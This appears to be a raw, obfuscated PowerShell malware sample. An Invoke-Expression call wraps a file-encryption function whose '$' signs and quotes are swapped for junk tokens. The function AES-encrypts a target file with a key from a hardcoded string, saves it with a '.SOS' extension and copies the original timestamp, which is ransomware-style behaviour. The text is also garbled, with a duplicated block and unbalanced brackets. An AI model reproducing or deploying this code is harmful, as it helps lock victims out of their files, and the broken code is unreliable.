iEX ('function Encryption {
    [CmdletBinding()]
    [OutputType([string])]
    Param
    (
        [Parameter(Mandatory = YPMtrue, ParameterSetName = jnOCryptFilejnO)]
        [String]YPMPath
    )

    Begin {
        YPMshaManaged = New-Object System.Security.Cryptography.SHA256Managed
        YPMaesManaged = New-Object System.Security.Cryptography.AesManaged
        YPMaesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
        YPMaesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
        YPMaesManaged.BlockSize = 128
        YPMaesManaged.KeySize = 256
    }

    Process {
        YPMaesManaged.Key = YPMshaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes(''YPMencryptedBytes''))

        if (YPMPath) {
            YPMFile = Get-Item -Path YPMPath -ErrorAction SilentlyContinue
            if (!YPMFile.FullName) {
                Write-Error -Message "File not found!"
                break
            }
            YPMplainBytes = [System.IO.File]::ReadAllBytes(YPMFile.FullName)
            YPMoutPath = YPMFile.FullName + ".SOS"
        }

        YPMencryptor = YPMaesManaged.CreateEncryptor()
        YPMencryptedBytes = YPMencryptor.TransformFinalBlock(YPMplainBytes, 0, YPMplainBytes.Length)
        YPMencryptedBytes = YPMaesManaged.IV + YPMencryptedBytes
        YPMaesManaged.Dispose()

        if (YPMPath) {
            [System.IO.File]::WriteAllBytes(YPMoutPath, YPMencryptedBytes)
            (Get-Item YPMoutPath).LastWriteTime = YPMFile.LastWriteTime
            return "File encrypted to YPMoutPath"))

        if (YPMPath) {
            YPMFile = Get-Item -Path YPMPath -ErrorAction SilentlyContinue
            if (!YPMFile.FullName) {
                Write-Error -Message "File not found!"
                break
            }
            YPMplainBytes = [System.IO.File]::ReadAllBytes(YPMFile.FullName)
            YPMoutPath = YPMFile.FullName + ".SOS"
        }

        YPMencryptor = YPMaesManaged.CreateEncryptor()
        YPMencryptedBytes = YPMencryptor.TransformFinalBlock(YPMplainBytes, 0, YPMplainBytes.Length)
        YPMencryptedBytes = YPMaesManaged.IV + YPMencryptedBytes
        YPMaesManaged.Dispose()

        if (YPMPath) {
            [System.IO.File]::WriteAllBytes(YPMoutPath, YPMencryptedBytes)
            (Get-Item YPMoutPath).LastWriteTime = YPMFile.LastWriteTime
            return "File encrypted to YPMoutPath"
        }
    }


    End {
        YPMshaManaged.Dispose()
        YPMaesManaged.Dispose()
    }
}' )